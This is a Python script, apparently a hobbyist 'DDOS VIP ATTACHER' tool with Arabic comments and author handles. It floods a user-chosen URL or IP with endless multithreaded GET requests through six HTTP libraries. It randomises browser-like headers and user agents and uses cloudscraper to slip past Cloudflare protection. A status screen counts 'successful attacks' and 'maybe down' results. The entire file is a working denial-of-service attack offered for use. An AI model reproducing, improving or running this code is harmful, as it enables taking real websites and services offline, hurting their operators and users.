import os
import importlib
import subprocess
import sys

# قائمة بالمكتبات المطلوبة واسم الحزمة إذا كان مختلفًا
REQUIRED_LIBRARIES = {
    'httpx': 'httpx',
    'requests': 'requests',
    'urllib3': 'urllib3',
    'cloudscraper': 'cloudscraper',
    'aiohttp': 'aiohttp',
    'user_agent': 'user_agent',
    'asyncio': 'asyncio',
    'concurrent.futures': 'concurrent.futures',
    'threading': 'threading',
    'random': 'random'
}

def install_library(library_name, package_name=None):
    if package_name is None:
        package_name = library_name
    try:
        importlib.import_module(library_name)
    except ImportError:
        print(f"جاري تثبيت المكتبة {package_name}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

# تثبيت المكتبات المطلوبة
for lib, pkg in REQUIRED_LIBRARIES.items():
    install_library(lib, pkg)

# استيراد المكتبات بعد التثبيت
import httpx
import requests
import urllib3
import urllib.request
import cloudscraper
import aiohttp
import asyncio
import random
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from random import choice
from user_agent import generate_user_agent

E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m'
A = '\033[2;34m'
C = '\033[2;35m'
B = '\x1b[38;5;208m'
Y = '\033[1;34m'
M = '\x1b[1;37m'
S = '\033[1;33m'
U = '\x1b[1;37m'

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} maho_s9    |
|{F}[+] Instagram  : {B}grq5 |
|{F}[+] Tool  : {B}DDOS VIP ATTACHER |
{E}==============================''')

url = input(f' {F}({C}1{F}) {Y} Enter Any Url or IP ADDRES ex (https://, http://) {F}  : ' + Z).strip()
print(X + ' ═════════════════════════════════  ')
num = int(input(f' {F}({C}2{F}) {Y} Enter The Power Of The Attack (1-100) : {F} : ' + Z))
print(X + ' ═════════════════════════════════  ')

good = 0
gg = 0
bb = 0

def Hrrani():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @maho_s9 | @maho9s | DDOS ATTACHER
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}Good Attach  -  هجمه ناجحة  » 「{good}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B} {B} MayBe Down - ربما الموقع سقط   » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} {Z}BAD Attach - هجمه فاشلة   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [6] {U} {U}Target Url  » 「{url}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')

def HEAD():
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "identity",
        "Accept-Charset": "utf-8",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Referer": "https://www.google.com/",
        "DNT": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Connection": "keep-alive",
        "User-Agent": str(generate_user_agent())
    }
    return headers

def send_requests():
    global good, gg, bb
    try:
        headers = HEAD()
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            good += 1
        else:
            gg += 1
    except:
        bb += 1
    Hrrani()

def send_httpx():
    global good, gg, bb
    try:
        headers = HEAD()
        protocol = random.choice([httpx.Client(http2=True), httpx.Client(http1=True)])
        with protocol as client:
            response = client.get(url, headers=headers)
            if response.status_code == 200:
                good += 1
            else:
                gg += 1
    except:
        bb += 1
    Hrrani()

def send_urllib3():
    global good, gg, bb
    try:
        headers = HEAD()
        http = urllib3.PoolManager()
        response = http.request("GET", url, headers=headers)
        if response.status == 200:
            good += 1
        else:
            gg += 1
    except:
        bb += 1
    Hrrani()

def send_urllib():
    global good, gg, bb
    try:
        headers = HEAD()
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            if response.status == 200:
                good += 1
            else:
                gg += 1
    except:
        bb += 1
    Hrrani()

def send_cloudscraper():
    global good, gg, bb
    try:
        headers = HEAD()
        scraper = cloudscraper.create_scraper()
        response = scraper.get(url, headers=headers)
        if response.status_code == 200:
            good += 1
        else:
            gg += 1
    except:
        bb += 1
    Hrrani()

async def send_aiohttp():
    global good, gg, bb
    try:
        headers = HEAD()
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    good += 1
                else:
                    gg += 1
    except:
        bb += 1
    Hrrani()

def Ahmed():
    with ThreadPoolExecutor(max_workers=num) as executor:
        try:
            while True:
                executor.submit(send_requests)
                executor.submit(send_httpx)
                executor.submit(send_urllib3)
                executor.submit(send_urllib)
                executor.submit(send_cloudscraper)
                executor.submit(asyncio.run, send_aiohttp())
        except RuntimeError:            
            pass
        except Exception:
            pass

threads = []
for _ in range(num):
    thread = Thread(target=Ahmed, daemon=True)
    threads.append(thread)
    thread.start()
try:
    for thread in threads:
        thread.join()
except KeyboardInterrupt:
    print("\n[!] تم الايقاف بنجاح شكرا .")
